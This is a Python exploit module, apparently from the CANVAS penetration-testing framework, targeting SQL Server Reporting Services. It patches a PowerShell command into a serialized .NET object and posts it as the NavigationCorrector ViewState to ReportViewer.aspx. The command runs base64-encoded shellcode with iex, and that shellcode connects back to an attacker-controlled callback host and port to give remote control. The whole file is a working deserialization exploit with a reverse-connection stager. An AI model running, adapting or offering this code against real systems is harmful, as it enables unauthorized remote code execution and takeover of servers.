import os
import sys
import json
import yaml
import time
import base64
import logging


if '.' not in sys.path:
    sys.path.append('.')


import canvasengine
from libs import spkproxy
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

from shellcode.standalone.windows.payloads64 import payloads as payloads64
from Nodes.mosdef_powershell.mosdef_powershell import *

from exploitutils import *
from canvasexploit import canvasexploit
from tcpexploit import tcpexploit

module_path = os.path.dirname(os.path.realpath(__file__))
with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())

NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']

def encoded_7bit_int(number, max_length=5):
    parts = []

    start_mask = (1<<7)-1
    mask = start_mask

    for i in range(0, max_length):
        if i == 0:
            pass
        else:
            mask = start_mask + (mask << 7)

        current = number & mask
        number -= current

        added_number = (current >> 7*i) | ((1<<7) if number else 0)

        parts.append(added_number)

        if not number:
            break

    return "".join([chr(part) for part in parts])

def decoded_7bit_int(data):
    # at max, use 5 bytes
    total = 0
    length = 0
    for i in range(0, 5):
        do_next = (ord(data[i]) & 0x80)
        total += (ord(data[i]) & 0x7f) << (7*i)
        length += 1
        if not do_next:
            break

    return (total, length)



def add_payload(serialized_object, payload):
    mosdef_needle = "-executionpolicy bypass -encodedcommand INSERT_POWERSHELL_MOSDEF"

    (orig_size, orig_size_len) = decoded_7bit_int(serialized_object[3:8])

    needle_offset = serialized_object.find(mosdef_needle)

    if needle_offset <= 0:
        raise Exception("Payload needle could not be found in the serialized object")

    needle_size = 0
    needle_size_len = 0
    i = 1
    while needle_size != len(mosdef_needle) and i <= 5:
        size_bytes = serialized_object[needle_offset-i:needle_offset]
        (needle_size, needle_size_len) = decoded_7bit_int(size_bytes)
        i += 1

    if needle_size != len(mosdef_needle):
        raise Exception("Payload needle size could not be found")

    payload_command = mosdef_needle.replace("INSERT_POWERSHELL_MOSDEF", payload)

    bytes_payload_size = encoded_7bit_int(len(payload_command))
    new_size = orig_size - len(mosdef_needle) + len(payload_command) - needle_size_len + len(bytes_payload_size)
    new_size_bytes = encoded_7bit_int(new_size)

    new_payload = [serialized_object[:3],
                   new_size_bytes,
                   serialized_object[3+orig_size_len:needle_offset-needle_size_len],
                   bytes_payload_size,
                   payload_command,
                   serialized_object[needle_offset+len(mosdef_needle):]
    ]

    return "".join(new_payload)


class theexploit(tcpexploit, object):
    def __init__(self):
        super(theexploit, self).__init__()

        self.protocol       = 'http://'
        self.remote_host    = ''
        self.port   = 80
        self.uri    = '/Reports'
        self.url    = self.remote_host + ':' + str(self.port) + self.uri
        
        self.user   = ''
        self.pwd    = ''
        self.domain = ''

        self.local_path             = os.path.dirname(__file__)
        self.binaries_path          = os.path.join(self.local_path, "Resources")

        self.use_local_interface    = False
        self.autoFind               = False

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.remote_host    = self.target.interface

        self.port           = int(self.argsDict.get('port', self.port))
        self.uri            = self.argsDict.get('uri', self.remote_host)

        self.url = self.protocol + self.remote_host + ':' + str(self.port) 

        logging.info('URL: %s' % self.url)
        logging.info('URI: %s' % self.uri)

        self.user           = self.argsDict.get('user', self.user)
        self.pwd            = self.argsDict.get('pwd', self.pwd)

        if '\\' in self.user:
            self.domain, self.user = self.user.split('\\')
            logging.info('DOMAIN: %s' % self.domain) 
        logging.info('USER: %s' % self.user)
        logging.info('PASSWORD: %s' % self.pwd)

    def make_request(self):
        ntml_auth = spkproxy.NTLMAuth(self.user, self.pwd, self.domain)

        req = spkproxy.UserAgent(self.url, auth=ntml_auth, hostname=self.remote_host)

        req.addHeader('Content-Type', 'application/x-www-form-urlencoded; charset=utf-8')
        req.addHeader('Accept', 'application/json')
        req.addHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
            
        return req

    def check(self):
        req = self.make_request()
        req.GET(self.uri) 

        status_code = req.response_head.split('\r\n')[0]
        if "200" in status_code:
            return True

        logging.error('The connection was unsuccessful: status code {}'.format(status_code))
        return False
    
    def check_service(self):
        req = self.make_request()
        req.GET(self.uri + '/api/v1.0/ReportServerInfo/Model.SiteName')

        status_code = req.response_head.split('\r\n')[0]
        if not "200" in status_code:
            logging.error('SQL Server Reporting Services is not avaible')
            return False
        
        try:
            if not (json.loads(req.response_body)['value'] == 'SQL Server Reporting Services'):
                logging.error('SQL Server Reporting Services cannot be verified')
                return False
        except ValueError as valuerr:
            logging.error('Value error: {}'.format(valuerr))
            return False
        except KeyError as keyerr:
            logging.error('Key error: {}'.format(keyerr))
            return False

        return True

    def get_virtual_dir(self):
        req = self.make_request()
        req.GET(self.uri + '/api/v1.0/ReportServerInfo/Model.GetVirtualDirectory')

        status_code = req.response_head.split('\r\n')[0]
        if not "200" in status_code:
            logging.error('Reporting Services Virtual Directory is not avaible')
            return False

        try:
            return json.loads(req.response_body)['value']
        except ValueError as valuerr:
            logging.error('Value error: {}'.format(valuerr))
            return False
        except KeyError as keyerr:
            logging.error('Key error: {}'.format(keyerr))
            return False

    def get_object(self, payload):
        evil_object = None

        with open(os.path.join(self.binaries_path, "psobject"), "rb") as obj:
            data = obj.read()
            evil_object = add_payload(data, payload)

        if evil_object == None:
            return False

        return evil_object


    def pspayload(self, shellcode):
        shellcode_fmt = ''
        for b in shellcode:
            shellcode_fmt +='0x' + b.encode("hex") + ','
        shellcode_fmt = shellcode_fmt[:-1]

        with open(os.path.join(self.binaries_path, 'loadshellcode.ps1'), 'rb') as _:
           execsc = _.read()

        execsc = execsc.replace('MOSDEF', shellcode_fmt)

        command = """
        iex $(New-Object IO.StreamReader ($(New-Object IO.MemoryStream(,$([Convert]::FromBase64String('{}')))), [Text.Encoding]::ASCII)).ReadToEnd()
        """.format(base64.b64encode(execsc))

        return command

    def mosdef_stager(self):
        logging.info(self.callback.ip)
        logging.info(self.callback.port)

        p = payloads64(module=self)
        asm = p.InjectToSelf(self.callback.ip, self.callback.port)
        shellcode = p.assemble(asm)

        psmosdef = mosdef_powershell(self)

        # 'hack' to use mosdef_powershell objects
        # is necessary set psmosdef.callback_script with the powershell payload
        payload = ''
        payload = str(self.pspayload(shellcode))
        psmosdef.callback_script = payload

        script_mosdef = psmosdef.generateEncPSCommand()

        evil_object = self.get_object(script_mosdef)

        return base64.b64encode(evil_object)

    def exploit(self, virt_dir, evil_object):
        req = self.make_request()
        req.addHeader('Pragma', 'no-cache')
        req.addHeader('Cache-Control', 'no-cache')

        data = {
            'NavigationCorrector$PageState' : 'NeedsCorrection',
            'NavigationCorrector$ViewState' : evil_object,
            '__VIEWSTATE' : ''
        }

        req.POST(virt_dir + '/Pages/ReportViewer.aspx', data)

    def run(self):
        self.getargs()

        evil_object = self.mosdef_stager()
        if not evil_object:
            return False
        
        if not self.check():
            return False

        if not self.check_service():
            return False

        virt_dir = self.get_virtual_dir()
        if not virt_dir:
            return False

        self.exploit(virt_dir, evil_object)

        sleeptime = 80
        logging.info('Sleeping for %ds' % sleeptime)
        is_succeded = False
        for i in xrange(0, sleeptime, 2):
            if self.state == self.HALT:
                logging.info("Halted")
                break
            logging.info("Slept: %d" % i)
            if self.ISucceeded():
                is_succeded = True
                break
            time.sleep(2)

        return is_succeded

if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
